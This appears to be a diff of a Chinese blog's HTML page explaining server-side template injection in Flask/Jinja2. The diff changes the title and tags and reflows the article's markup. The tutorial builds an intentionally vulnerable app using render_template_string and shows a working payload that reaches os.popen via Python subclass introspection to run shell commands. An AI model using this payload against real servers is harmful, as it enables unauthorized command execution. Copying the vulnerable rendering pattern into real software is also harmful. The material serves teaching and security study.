@@ -103,7 +103,7 @@
 
 
 
-  <meta name="keywords" content="SSTI,服务端模板注入,web," />
+  <meta name="keywords" content="SSTI,服务端模板注入,web,python 沙箱逃逸," />
 
 
 
@@ -115,9 +115,9 @@
 
 
 <meta name="description" content="推荐文章 https://portswigger.net/blog/server-side-template-injection 以 flask+jinja2 的 SSTI 为例分析 SSTI SSTISSTI (Server-Side Template Injection) 服务端模板注入，那么要先了解模板是什么 模板首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实">
-<meta name="keywords" content="SSTI,服务端模板注入,web">
+<meta name="keywords" content="SSTI,服务端模板注入,web,python 沙箱逃逸">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SSTI 服务端模板注入简析">
+<meta property="og:title" content="从 flask+jinjia2 认识 SSTI 服务端模板注入">
 <meta property="og:url" content="http://AbelChe.com/2019/07/27/SSTI-服务端模板注入简析/index.html">
 <meta property="og:site_name" content="AbelChe&#39;s Blog">
 <meta property="og:description" content="推荐文章 https://portswigger.net/blog/server-side-template-injection 以 flask+jinja2 的 SSTI 为例分析 SSTI SSTISSTI (Server-Side Template Injection) 服务端模板注入，那么要先了解模板是什么 模板首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实">
@@ -131,9 +131,9 @@
 <meta property="og:image" content="https://qqfarw.sn.files.1drv.com/y4mIdxNYH1oYncJxtIE5v-fRFeQLkpWyC3RYajOrHIyvd3PpJltEW-KAqloU2F3B3U921-1oCcOPmnlHH9RDgKig-_TNmPPK2fzRKOtJpsaGrl_g9tQypX11SAgSBJI1kqY9bE7JPL5Nf-2FiE-aAMPEslrtYAG19QGkV3S2DGF65MPFRVm7S75-UkxvbZFZlAdabwjDo0CygG_l7ZSB3AIlg?width=1909&height=138&cropmode=none">
 <meta property="og:image" content="https://q6fcrw.sn.files.1drv.com/y4myLNDZak2pCjhPIenf32kI7a3LLRkhH0Ir5BIv4Ffn6A7hmtH7rKKPjLPQ5H-n1Ehzisv7N3J1cZI3HxPSTIOguXF95B3z7i0AYW1DKfqLhEg-u6rZmPuu0Ro6T2tu14uOotDOS96PD-n60n7e4v6uquf8rquH1i5InQPcbnZld8TN1C2_MhZckiTGHFXJOWIakiBMEpaCHvJkF2TaFXVYw?width=640&height=386&cropmode=none">
 <meta property="og:image" content="https://q6farw.sn.files.1drv.com/y4mU28XYNAZtf0cR4k__c2hnFenGREBawUThRvg9Z66f12ZGgEZVVXiZ36jaTDITgiGpeigBlYklGeMGdAdF3jURQF7wZUu4vYHm7W3mC8MBJwkWPuBvVDwfzycHnCjGI3cw-dwI7JaMcb1-ggC_TJJlpN5x91SebR47n9pzx_CijUxd4B9_ScNkJZMeGO-IHN4pSKgvSpbhA1ax8YnYrnzaQ?width=732&height=835&cropmode=none">
-<meta property="og:updated_time" content="2019-07-28T15:05:06.747Z">
+<meta property="og:updated_time" content="2019-07-29T04:27:19.234Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SSTI 服务端模板注入简析">
+<meta name="twitter:title" content="从 flask+jinjia2 认识 SSTI 服务端模板注入">
 <meta name="twitter:description" content="推荐文章 https://portswigger.net/blog/server-side-template-injection 以 flask+jinja2 的 SSTI 为例分析 SSTI SSTISSTI (Server-Side Template Injection) 服务端模板注入，那么要先了解模板是什么 模板首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实">
 <meta name="twitter:image" content="https://8ke7rw.sn.files.1drv.com/y4maedzleRsLFxdY5nF7fH88VfDC11rTKHBin0_-Havq7y5z6Ptgod5u_uLfRV1AbFpNIQYOpa0OEMa70_bz0tlETO78KV8ZrSqi9I5dGbTXv7Rem3JU-mZPth3QjkMisOsa_nstR_UQKWjGALwA_k9h3KOfJhnZFNRO6EZ66tBaVCs8CZVaK-CiUqzQgFgeZVd0GEgxCheZsVDOQ6plTqGIw?width=807&height=404&cropmode=none">
 
@@ -171,7 +171,7 @@
 
 
 
-  <title>SSTI 服务端模板注入简析 | AbelChe's Blog</title>
+  <title>从 flask+jinjia2 认识 SSTI 服务端模板注入 | AbelChe's Blog</title>
   
 
 
@@ -379,7 +379,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">SSTI 服务端模板注入简析</h2>
+          <h2 class="post-title" itemprop="name headline">从 flask+jinjia2 认识 SSTI 服务端模板注入</h2>
         
 
         <div class="post-meta">
@@ -407,8 +407,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-07-28T23:05:06+08:00">
-                2019-07-28
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-29T12:27:19+08:00">
+                2019-07-29
               </time>
             
           </span>
@@ -472,7 +472,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,800 字
+                  1,796 字
                 </span>
               
 
@@ -521,47 +521,33 @@
 <p>举个例子：(django)</p>
 <blockquote>
 <p>前端代码：index.html</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>后端代码：view.py</p>
+</blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">'message'</span>: <span class="string">'hello world'</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> render(request, <span class="string">'index.html'</span>, data)</span><br></pre></td></tr></table></figure>
-</blockquote>
-<blockquote>
-<p>那么当我们去访问 index.html 这个页面的时候页面从后端拿到message的数据</p>
-<p>呈现给用户的页面显示为：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</blockquote>
+<p>那么当我们去访问 index.html 这个页面的时候页面从后端拿到message的数据<br>呈现给用户的页面显示为：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="SSTI-1"><a href="#SSTI-1" class="headerlink" title="SSTI"></a>SSTI</h2><p>web 应用程序通过使用模板在网页中嵌入动态内容，那么如果显示的内容是用户可控的，可能首先会想到 XSS ，而存在 XSS 的地方很有可能存在 SSTI</p>
 <p><img src="https://q6fbrw.sn.files.1drv.com/y4mejS9j8grOQ9skPUeAFuQviqVH03U4Jm629JbS4g1xWcTj4jtDdlcNQqz44K4k5ii-KhOpmuXUZ7LQa5WtJ2bi1PkGqI4AQtg9VkKysHTwnsI64B8U_MbUQPxJ0E3QJixjF_uc7Uuq-wQK_cWKjH25vpqN-WDW0Vj4taUCjlbroVJQO5yAAsvPWcJfmzg2GJyJl5mR7h7prm0c7iEVrNzWQ?width=807&amp;height=225&amp;cropmode=none" alt=""></p>
 <h2 id="本地测试（flask-jinja2）"><a href="#本地测试（flask-jinja2）" class="headerlink" title="本地测试（flask + jinja2）"></a>本地测试（flask + jinja2）</h2><p>新建一个 flask 项目：</p>
 <blockquote>
 <p>app.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hello/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">(name)</span>:</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'welcome.html'</span>, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/h/&lt;name&gt;', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></span><br><span class="line">template = <span class="string">'''</span></span><br><span class="line"><span class="string">      &lt;div&gt;</span></span><br><span class="line"><span class="string">          &lt;h3&gt;hello %s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">  '''</span> % name</span><br><span class="line"><span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">app.run(</span><br><span class="line">  host=<span class="string">'127.0.0.1'</span>,</span><br><span class="line">  port=<span class="number">8000</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
 </blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hello/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">(name)</span>:</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'welcome.html'</span>, name=name)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/h/&lt;name&gt;', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></span><br><span class="line">template = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;h3&gt;hello %s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">'''</span> % name</span><br><span class="line"><span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">app.run(</span><br><span class="line">host=<span class="string">'127.0.0.1'</span>,</span><br><span class="line">port=<span class="number">8000</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>welcome.html</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this is a SSTI test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>hello &#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>index.html</p>
 </blockquote>
-<blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this is a SSTI test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h3</span>&gt;</span>hello &#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>结果如图：</p>
 <p><img src="https://q6eqrw.sn.files.1drv.com/y4mzrn1oKK7TVtR_0nKAA4ZWZ44HUBFaDgjaasQK_vFEEIMhZmBV2rixIdbdidKCNnaGePNbUO7rehzcVfguxXfd0h-8rMj_dGMiQQBOOgolqbpuRvG9539YgqFxgS4MJruOyPGjNIIgS0iAJVVsmjL8Tx4vl439ZkcQeFkaj7Zwm43fDatUcK1j5u5h5HJWnyz9J-ioInxnTbMVbjvAk74cg?width=794&amp;height=124&amp;cropmode=none" alt=""></p>
 <p><img src="https://q6eprw.sn.files.1drv.com/y4m4ugGl9-dFBgF75-lHExaiK8nftBMRZPNhgaKt2b02ITX0QOVsbAmRVnk7i2NCECJs83EAZKhO1h9HhWSWWB1oRMGskSi9Ni6PF4Rfxsk6lUmOlCN4K09T91KGfF8B3Y4HIFn6NLO34X5peDNsaeG6nJLJwGvzZVK__Y09lohrP6ZBZeshwkLn6b1TxuLauSDPoMxxFCxys6s4evblSHELA?width=782&amp;height=126&amp;cropmode=none" alt=""></p>
 <p>明显 flask 返回模板字符串的存在 XSS</p>
 <p>第一个没有触发XSS的原因就是模板对符号进行了编码即用户对此不可控</p>
 <p><img src="https://q6e9rw.sn.files.1drv.com/y4mSbC9IGRGhsWFqEbj103mM9rob-omkZheboqp3YYBf7f8ovUBfcrKELCGT8uicJbw2SaepMGbGqW0rorPpCB7nMYP-tO74XJ-CywzEAwG2U5qHfpHGhNyGvHEqgdmwmjYSJoMoFA30vxxMhQsQuq_4n-XSraq0j55RngxrT9uRXE_ib5eUs556k49Q6WRoQoq09ylaaLooZjjl0Kc0gFlpA?width=964&amp;height=301&amp;cropmode=none" alt=""></p>
-<p>继续在触发 XSS 的点进行 SSTI 测试：</p>
-<p>最简单的 payload :<br><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">12312</span>*213&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<blockquote>
-<p><img src="https://qqfbrw.sn.files.1drv.com/y4mC8SfgvO41Nysziu5yiFZQ-dgrt4Mbr2yZMxrfNC3uTko0znQgmtGRKsR88IMJeS6ZvumqFUf4bdXlmSiJuDha6mdHMnQUtjXtoHnnvqdyKr2eReNQsC9rSCwx5-HnoJJux1DWNQKn116zCWX8oNtnAijvAUFvJJKOLwVY-dnVKr83QH4RqHm8Tfrpts7soJfxYpJWPfE0ZnvyR-VFljxnA?width=503&amp;height=114&amp;cropmode=none" alt=""></p>
-<p>代码执行成功</p>
-<p>试下查看目录，payload：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">128</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'dir'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<blockquote>
-<p><img src="https://qqfarw.sn.files.1drv.com/y4mIdxNYH1oYncJxtIE5v-fRFeQLkpWyC3RYajOrHIyvd3PpJltEW-KAqloU2F3B3U921-1oCcOPmnlHH9RDgKig-_TNmPPK2fzRKOtJpsaGrl_g9tQypX11SAgSBJI1kqY9bE7JPL5Nf-2FiE-aAMPEslrtYAG19QGkV3S2DGF65MPFRVm7S75-UkxvbZFZlAdabwjDo0CygG_l7ZSB3AIlg?width=1909&amp;height=138&amp;cropmode=none" alt=""></p>
-<p>getshell 什么的也不用多说了</p>
-</blockquote>
+<p>继续在触发 XSS 的点进行 SSTI 测试：<br>最简单的 payload :<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">12312</span>*<span class="number">213</span>&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://qqfbrw.sn.files.1drv.com/y4mC8SfgvO41Nysziu5yiFZQ-dgrt4Mbr2yZMxrfNC3uTko0znQgmtGRKsR88IMJeS6ZvumqFUf4bdXlmSiJuDha6mdHMnQUtjXtoHnnvqdyKr2eReNQsC9rSCwx5-HnoJJux1DWNQKn116zCWX8oNtnAijvAUFvJJKOLwVY-dnVKr83QH4RqHm8Tfrpts7soJfxYpJWPfE0ZnvyR-VFljxnA?width=503&amp;height=114&amp;cropmode=none" alt=""><br>代码执行成功<br>试下查看目录，payload：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'dir'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://qqfarw.sn.files.1drv.com/y4mIdxNYH1oYncJxtIE5v-fRFeQLkpWyC3RYajOrHIyvd3PpJltEW-KAqloU2F3B3U921-1oCcOPmnlHH9RDgKig-_TNmPPK2fzRKOtJpsaGrl_g9tQypX11SAgSBJI1kqY9bE7JPL5Nf-2FiE-aAMPEslrtYAG19QGkV3S2DGF65MPFRVm7S75-UkxvbZFZlAdabwjDo0CygG_l7ZSB3AIlg?width=1909&amp;height=138&amp;cropmode=none" alt=""><br>getshell 什么的也不用多说了</p>
 <h1 id="python-常用内建属性"><a href="#python-常用内建属性" class="headerlink" title="python 常用内建属性"></a>python 常用内建属性</h1><h2 id="class"><a href="#class" class="headerlink" title="__class__"></a>__class__</h2><p>__class__ 可以用来查看对象的类型,返回值为 type</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">list</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ''.<span class="title">__class__</span>.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">type</span>'&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="bases"><a href="#bases" class="headerlink" title="__bases__"></a>__bases__</h2><p>__bases__ 可以列出该类的基类，返回值为 tuple</p>
@@ -653,7 +639,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://AbelChe.com/2019/07/27/SSTI-服务端模板注入简析/" title="SSTI 服务端模板注入简析">http://AbelChe.com/2019/07/27/SSTI-服务端模板注入简析/</a>
+    <a href="http://AbelChe.com/2019/07/27/SSTI-服务端模板注入简析/" title="从 flask+jinjia2 认识 SSTI 服务端模板注入">http://AbelChe.com/2019/07/27/SSTI-服务端模板注入简析/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -673,6 +659,8 @@
             <a href="/tags/服务端模板注入/" rel="tag"># 服务端模板注入</a>
           
             <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/python-沙箱逃逸/" rel="tag"># python 沙箱逃逸</a>
           
         </div>
       
@@ -805,7 +793,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">74</span>
+                  <span class="site-state-item-count">77</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -952,7 +940,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">38.8k</span>
+    <span title="Site words total count">39.2k</span>
   
 </div>
 
